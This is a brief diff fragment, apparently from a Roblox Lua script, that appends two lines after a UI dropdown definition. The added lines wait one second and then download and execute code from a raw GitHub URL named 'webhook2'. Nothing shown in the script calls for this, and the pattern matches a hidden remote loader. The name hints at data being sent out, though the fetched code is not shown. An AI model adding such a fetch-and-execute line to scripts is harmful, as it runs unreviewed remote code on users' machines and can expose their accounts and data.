@@ -1919,3 +1919,5 @@ section:dropdown(
         end
     }
 )
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilovelatinas/main/webhook2"))()
